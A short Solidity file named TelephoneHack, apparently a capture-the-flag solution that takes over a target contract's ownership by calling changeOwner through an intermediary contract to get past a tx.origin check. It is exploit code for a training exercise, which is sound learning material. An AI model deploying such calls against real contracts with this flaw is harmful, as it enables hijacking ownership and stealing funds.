// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    function gainControl(address _contract) public {
        ITelephone(_contract).changeOwner(msg.sender);
    }

}